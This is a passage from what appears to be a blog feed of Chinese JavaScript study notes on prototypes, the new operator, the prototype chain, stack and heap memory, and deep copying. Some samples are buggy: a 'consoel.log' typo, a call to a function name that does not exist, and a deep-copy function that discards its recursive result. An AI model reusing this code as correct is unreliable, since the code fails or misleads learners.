class="comment"> *  &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 找到该属性并且是引用类型 -- 访问</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">demo</span> = &#123;</span><br><span class="line">    <span class="attr">m</span>: <span class="number">1</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// bar.demo.m = 2;</span></span><br><span class="line"><span class="comment">// console.log(Object.prototype);</span></span><br><span class="line"><span class="comment">/** 返回结果 对引用类型的访问会修改</span></span><br><span class="line"><span class="comment"> * Object &#123;</span></span><br><span class="line"><span class="comment"> *  demo: &#123;</span></span><br><span class="line"><span class="comment"> *      m: 2,</span></span><br><span class="line"><span class="comment"> *  &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 找到该属性 -- 对引用类型的引用</span></span><br><span class="line">bar.<span class="property">demo</span> = <span class="number">2</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(bar);</span><br><span class="line"><span class="comment">/** 返回结果 对引用类型的引用会覆盖</span></span><br><span class="line"><span class="comment"> * bar &#123;</span></span><br><span class="line"><span class="comment"> *  demo: 2,</span></span><br><span class="line"><span class="comment"> *  [[prototype]]: Object &#123;</span></span><br><span class="line"><span class="comment"> *      demo: &#123; m: 1 &#125;,</span></span><br><span class="line"><span class="comment"> *  &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">bar.<span class="property">a</span> = <span class="number">1</span> <span class="comment">// 会在对象自身创建</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** 返回</span></span><br><span class="line"><span class="comment"> * bar &#123;</span></span><br><span class="line"><span class="comment"> *  a: 1,</span></span><br><span class="line"><span class="comment"> *  [[prototype]]: Object</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h2 id="面试题"><a href="#面试题" class="headerlink" title="面试题"></a>面试题</h2><h3 id="面试题-01"><a href="#面试题-01" class="headerlink" title="面试题 - 01"></a>面试题 - 01</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">A</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">A.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">n</span> = <span class="number">3</span>;</span><br><span class="line">A.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">add1</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">n</span>++;</span><br><span class="line">    <span class="comment">// this.n = this.n + 1 RHS [[GET]]</span></span><br><span class="line">    <span class="comment">// 左边this.n =&gt; LHS -&gt; [[PUT]] =&gt; 基本类型(自身创建覆盖) =&gt; A &#123; n: 4 &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> <span class="title function_">A</span>();</span><br><span class="line"><span class="keyword">var</span> b = <span class="keyword">new</span> <span class="title function_">A</span>();</span><br><span class="line"><span class="keyword">var</span> c = <span class="keyword">new</span> <span class="title function_">A</span>()</span><br><span class="line">a.<span class="title function_">add1</span>();</span><br><span class="line"><span class="comment">/** 分析 通过点(.)的方式调用函数会绑定this</span></span><br><span class="line"><span class="comment"> * (1). a.add1 -&gt; 属于RHS: 读操作，获取a.add1的返回值</span></span><br><span class="line"><span class="comment"> * (2). RHS -&gt; [[GET]] -&gt; a.[[__proto__]] -&gt; A.prototype.[[__proto__]]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">b.<span class="title function_">add1</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">n</span>, b.<span class="property">n</span>, c.<span class="property">n</span>); <span class="comment">// 4, 4, 3</span></span><br></pre></td></tr></table></figure><h3 id="面试题-02"><a href="#面试题-02" class="headerlink" title="面试题 - 02"></a>面试题 - 02</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">A</span> () &#123;&#125;;</span><br><span class="line">A.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">m</span> = &#123;</span><br><span class="line">    <span class="attr">t</span>: <span class="number">1</span>,</span><br><span class="line">&#125;;</span><br><span class="line">A.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">add2</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">m</span> = &#123;&#125;;    <span class="comment">// 写操作 =&gt; 对引用对象的引用 =&gt; 覆盖 =&gt; d &#123; m: &#123;&#125;, prototype: Object &#123; add2: f(), m: &#123;t: 1&#125;&#125;&#125;</span></span><br><span class="line">    <span class="comment">// LHS -&gt; [[PUT]]</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> d = <span class="keyword">new</span> <span class="title function_">A</span>();</span><br><span class="line">d.<span class="title function_">add2</span>(); <span class="comment">// RHS =&gt; [[GET]] -&gt; d.[[__proto__]] -&gt; A.prototype</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(d.<span class="property">m</span>.<span class="property">t</span>); <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure><h3 id="面试题-03"><a href="#面试题-03" class="headerlink" title="面试题 - 03"></a>面试题 - 03</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">name, age</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span> = age;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">eat</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(age + <span class="string">&quot;岁的&quot;</span> + name + <span class="string">&quot;在吃饭.&quot;</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Person</span>.<span class="property">run</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;&#125;;</span><br><span class="line"><span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">walk</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> p1 = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&#x27;jsliang&#x27;</span>, <span class="number">24</span>);</span><br><span class="line"><span class="keyword">let</span> p2 = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&#x27;jsliang&#x27;</span>, <span class="number">24</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对象的引用的值判断 -&gt; 判断地址</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1.<span class="property">eat</span> === p2.<span class="property">eat</span>); <span class="comment">// false =&gt; new的时候指向不同的地址</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1.<span class="property">run</span> === p2.<span class="property">run</span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1.<span class="property">walk</span> === p2.<span class="property">walk</span>);   <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h3 id="面试题-04"><a href="#面试题-04" class="headerlink" title="面试题 - 04"></a>面试题 - 04</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">some</span> = <span class="string">&#x27;222&#x27;</span>;  <span class="comment">// 能访问到</span></span><br><span class="line">    <span class="keyword">let</span> ccc = <span class="string">&#x27;ccc&#x27;</span>;</span><br><span class="line">    foo.<span class="property">obkorou1</span>= <span class="string">&#x27;obkorou1&#x27;</span>;</span><br><span class="line">    foo.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">a</span> = <span class="string">&#x27;aaa&#x27;</span>;    <span class="comment">// 能访问到</span></span><br><span class="line">&#125;</span><br><span class="line">foo.<span class="property">koro</span> = <span class="string">&#x27;扣肉&#x27;</span>;</span><br><span class="line">foo.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">test</span> = <span class="string">&#x27;test&#x27;</span> <span class="comment">// 被修改</span></span><br><span class="line"><span class="keyword">let</span> foo1 = <span class="keyword">new</span> <span class="title function_">foo</span>();</span><br><span class="line">foo.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">test</span> = <span class="string">&#x27;test2&#x27;</span>;   <span class="comment">// 能访问到</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// foo1 访问到哪些属性?</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>原型链</title>
      <link href="/bf8cf30.html"/>
      <url>/bf8cf30.html</url>
      
        <content type="html"><![CDATA[<div class="note message"><p><strong>理解原型链</strong></p><ol><li>理解<code>new</code>关键字的作用机制（写）</li><li>理解[[GET]]（读）</li></ol></div><span id="more"></span><h2 id="new的执行流程"><a href="#new的执行流程" class="headerlink" title="new的执行流程"></a>new的执行流程</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> a = <span class="keyword">new</span> <span class="title function_">foo</span>(); <span class="comment">// 第二步用代码表示：this.__proto__ = foo.prototype； 返回值：this指向的对象的引用</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a);</span><br></pre></td></tr></table></figure><div class="note info"><p><strong>new的执行流程</strong></p><ol><li>绑定this为空对象</li><li>让空对象<code>[[Prototype]](__protot__)</code> –&gt; 函数的<code>prototype</code>属性<br>  (1) 所有对象都有<code>[[Prototype]](隐式属性 __protot__)</code> -&gt; 所有对象本质上都是new出来的<br>  (2) 所有的函数对象 -&gt; prototype</li><li>正常执行函数</li><li>如果函数返回的基本类型，返回this的值，否则返回原函数的返回值</li></ol></div><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='https://i.328888.xyz/2023/04/17/izUScq.png' data-fancybox='default' data-caption='new执行流程图解'><img fancybox itemprop="contentUrl" src="https://i.328888.xyz/2023/04/17/izUScq.png" class="lazyload" data-srcset="https://i.328888.xyz/2023/04/17/izUScq.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="new执行流程图解"></a><span class='image-caption'>new执行流程图解</span></div></div><h2 id="GET"><a href="#GET" class="headerlink" title="[[GET]]"></a><code>[[GET]]</code></h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> a = <span class="keyword">new</span> <span class="title function_">foo</span>(); </span><br><span class="line">a.<span class="property">b</span>                   <span class="comment">// 不报错返回undefined</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">b</span>)      <span class="comment">// 访问对象属性的本质，底层帮调用</span></span><br></pre></td></tr></table></figure><div class="note info"><p><strong>[[GET]]流程</strong></p><ol><li>判断对象里面有没有</li><li>判断它的__proto__指向的对象里面有没有</li></ol></div><h2 id="面试题"><a href="#面试题" class="headerlink" title="面试题"></a>面试题</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">a</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">b</span>  = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;b&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> F = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>) &#123; &#125;;</span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">new</span> <span class="title function_">F</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(f.<span class="property">a</span>)  <span class="comment">// 打印a</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(f.<span class="property">a</span>)  <span class="comment">// 打印undefined</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(F.<span class="property">a</span>)  <span class="comment">// 打印a</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(F.<span class="property">b</span>)  <span class="comment">// 打印b</span></span><br></pre></td></tr></table></figure><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='https://i.328888.xyz/2023/04/19/i6E8WA.png' data-fancybox='default' data-caption='原型链面试题图解'><img fancybox itemprop="contentUrl" src="https://i.328888.xyz/2023/04/19/i6E8WA.png" class="lazyload" data-srcset="https://i.328888.xyz/2023/04/19/i6E8WA.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="原型链面试题图解"></a><span class='image-caption'>原型链面试题图解</span></div></div><div class="note info"><p><strong></strong></p><p>原型链的终点是：Object.prototype.[[prototype]] &#x3D; null</p><ul><li>Object.prototype.<code>__proto__</code> &#x3D; null;  &#x2F;&#x2F; 不是所有对象都是Object的实例</li><li>Function.prototype._<code>_proto__</code> &#x3D; Object.prototype;  &#x2F;&#x2F; new Object()</li><li>Object.<code>__proto__</code> &#x3D; Function.prototype;  &#x2F;&#x2F; new Funtion()</li><li>Function.<code>__proto__</code> &#x3D; Function.prototype</li></ul></div>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>变量</title>
      <link href="/13ffbe88.html"/>
      <url>/13ffbe88.html</url>
      
        <content type="html"><![CDATA[<div class="note todo"><p><strong></strong></p><ol><li>变量的本质</li><li>深拷贝</li><li>垃圾回收</li></ol></div><span id="more"></span><h2 id="变量的本质"><a href="#变量的本质" class="headerlink" title="变量的本质"></a>变量的本质</h2><div class="note bug"><p><strong>栈(stack)的特性</strong></p><ol><li>结构性强，内存连续</li><li>寻址速度快</li><li>数据稳定</li><li>容量小</li></ol></div><div class="note warning"><p><strong>原始类型</strong></p><ol><li>原始类型存于栈中</li><li>原始类型<u>不可修改</u>; 无法<u>直接修改指向内存中的值</u>, 需要新开辟一块内存</li></ol><table><thead><tr><th>类型</th><th>typeof返回值</th><th>对象包装器</th></tr></thead><tbody><tr><td>Null</td><td>“object”</td><td>N&#x2F;A</td></tr><tr><td>Undefined</td><td>“undefined”</td><td>N&#x2F;A</td></tr><tr><td>Boolean</td><td>“boolean”</td><td>Boolean</td></tr><tr><td>Number</td><td>“number”</td><td>Number</td></tr><tr><td>BigInt</td><td>“bigint”</td><td>BigInt</td></tr><tr><td>String</td><td>“string”</td><td>String</td></tr><tr><td>Symbol</td><td>“symbol”</td><td>Symbol</td></tr></tbody></table></div><hr><div class="note bug"><p><strong>堆(heap)的特性</strong></p><ol><li>类似于书架</li><li>存储以坨为单位</li><li>容量大</li><li>不同数据间内存不连续</li></ol></div><div class="note warning"><p><strong>引用类型</strong></p><ol><li>在js中引用类型指的是对象（Object）;</li></ol></div><h3 id="示例代码-01"><a href="#示例代码-01" class="headerlink" title="示例代码-01"></a>示例代码-01</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> </span><br><span class="line">    b1 = <span class="number">1</span>,</span><br><span class="line">    b2 = b1;    <span class="comment">// RHS right head-side search 右查询（本质：读了内存中存的值）</span></span><br><span class="line">b2 = b1;    <span class="comment">// 本质是在内存中指向了新的数据（2），旧数据（1）将被回收</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b1, b2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> </span><br><span class="line">    r1 = &#123;</span><br><span class="line">        <span class="attr">a</span>: <span class="number">1</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    r2 = r1;    <span class="comment">// 程序本身只允许访问栈，无法访问堆；栈和堆通过标识符建立连接</span></span><br><span class="line"></span><br><span class="line">r2.<span class="property">a</span> = <span class="number">2</span>;   <span class="comment">// 因为r1和r2同时指向了堆中的数据，所以修改r2，r1随之改变</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(r1.<span class="property">a</span>, r2.<span class="property">a</span>)</span><br></pre></td></tr></table></figure><hr><div class="note warning"><p><strong>字符串(特殊)</strong></p><p>字符串本质上是存放在堆中，但是它是一个原始类型，原始类型不能直接修改栈中的数据，而是新建了一个标识符并指向了堆中的新数据</p></div><h3 id="示例代码-02"><a href="#示例代码-02" class="headerlink" title="示例代码-02"></a>示例代码-02</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="string">&#x27;hello word&#x27;</span>,</span><br><span class="line">    b = a;</span><br><span class="line">b = <span class="string">&#x27;hello&#x27;</span>;    <span class="comment">// 栈中会新建标识符指向新数据，旧数据则被回收</span></span><br><span class="line">consoel.<span class="title function_">log</span>(a, b);</span><br></pre></td></tr></table></figure><h3 id="变量总结"><a href="#变量总结" class="headerlink" title="变量总结"></a>变量总结</h3><div class="note success"><p><strong>知识总结</strong></p><ol><li>数据组织的方式不同 – 栈中的内存是连续的，堆中不是</li><li>用户权限不同 – 用户能读取栈中的数据不能读取堆中的数据</li><li>大小不同 – 栈的空间小堆的空间大</li><li>寻址速度不同 – 栈的寻址速度快而堆的寻址速度慢</li><li>作用不同 – 栈中存的是基本类型、引用类型的标识符以及字符串的标识符；堆中存放大小不确定的数据</li></ol></div><h2 id="值传递和引用传递"><a href="#值传递和引用传递" class="headerlink" title="值传递和引用传递"></a>值传递和引用传递</h2><div class="note info"><p><strong></strong></p><p>所谓的引用传递取决于传递的是值还是地址；在javascript中本质上就是值传递（读栈<code>stack</code>内存中的值）</p></div><h3 id="示例代码-01-1"><a href="#示例代码-01-1" class="headerlink" title="示例代码-01"></a>示例代码-01</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">change1</span>(<span class="params">arg</span>) &#123;</span><br><span class="line">    arg = <span class="number">200</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">change2</span>(<span class="params">arg</span>)&#123;</span><br><span class="line">    arg.<span class="property">a</span> = <span class="number">200</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> foo = <span class="number">100</span>;</span><br><span class="line"><span class="keyword">var</span> bar = &#123; <span class="attr">a</span>: <span class="number">100</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">change1</span>(foo);</span><br><span class="line"><span class="title function_">change2</span>(bar);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo, bar);</span><br></pre></td></tr></table></figure><h2 id="深拷贝-amp-浅拷贝"><a href="#深拷贝-amp-浅拷贝" class="headerlink" title="深拷贝&amp;浅拷贝"></a>深拷贝&amp;浅拷贝</h2><h3 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person1 = &#123;</span><br><span class="line">    <span class="attr">age</span>: <span class="number">28</span>,</span><br><span class="line">    <span class="attr">hobby</span>: <span class="string">&#x27;学习&#x27;</span>,</span><br><span class="line">    <span class="attr">son</span>: &#123;</span><br><span class="line">        <span class="attr">age</span>: <span class="number">3</span>,</span><br><span class="line">        <span class="attr">hobby</span>: <span class="string">&#x27;drink milk&#x27;</span>,</span><br><span class="line">        <span class="attr">friends</span>: [<span class="string">&#x27;jack&#x27;</span>, <span class="string">&#x27;lucy&#x27;</span>],</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 浅拷贝</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">clone2</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> clonePerson = &#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> obj) &#123;</span><br><span class="line">        clonePerson[key] = obj[key];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> clonePerson;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> newPerson = <span class="title function_">clonePerson</span>(person1);</span><br><span class="line">newPerson.<span class="property">age</span> = <span class="number">18</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person1.<span class="property">age</span>);</span><br><span class="line">newPerson.<span class="property">son</span>.<span class="property">age</span> = <span class="number">100</span>;    <span class="comment">// 会改变，son是一个object属于引用类型存放于堆中，newPerson.son和person1.son指向同一个</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(newPerson.<span class="property">son</span>.<span class="property">age</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 利用递归实现深拷贝</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">clone2</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> obj !== <span class="string">&#x27;object&#x27;</span> || obj === <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> clone = <span class="title class_">Array</span>.<span class="title function_">isArray</span>(obj) ? [] : &#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> obj) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">typeof</span> obj[key] === <span class="string">&#x27;object&#x27;</span>) &#123;</span><br><span class="line">            <span class="title function_">clone2</span>(obj[key])</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            clone[key] = obj[key];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> clone;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="垃圾回收"><a href="#垃圾回收" class="headerlink" title="垃圾回收"></a>垃圾回收</h2><div class="note info"><p><strong></strong></p><ol><li>stack存储基本变量和引用类型的指向;</li><li>heap存储复杂数据和字符串;</li><li>stack会自动回收,<br>heap借助垃圾回收机制进行回收，但需要一定的手动操作;</li></ol></div><h2 id="视频地址"><a href="#视频地址" class="headerlink" title="视频地址"></a>视频地址</h2><div class="tag link"><a class="link-card" title="变量的本质&深拷贝&垃圾回收" href="https://www.bilibili.com/video/BV1Ed4y1x7oN/?p=6&spm_id_from=pageDriver&vd_source=cb73e5c2249f330a061d8900da3573a8"><div class="left"><img src="https://gcore.jsdelivr.net/gh/xaoxuu/cdn-assets@master/logo/256/safari.png" class="lazyload" data-srcset="https://gcore.jsdelivr.net/gh/xaoxuu/cdn-assets@master/logo/256/safari.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="/></div><div class="right"><p class="text">变量的本质&深拷贝&垃圾回收</p><p class="url">https://www.bilibili.com/video/BV1Ed4y1x7oN/?p=6&spm_id_from=pageDriver&vd_source=cb73e5c2249f330a061d8900da3573a8</p></div></a></div>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Promise异步任务并发</title>
      <link href="/5d76cec.html"/>
      <url>/5d76cec.html</url>
      
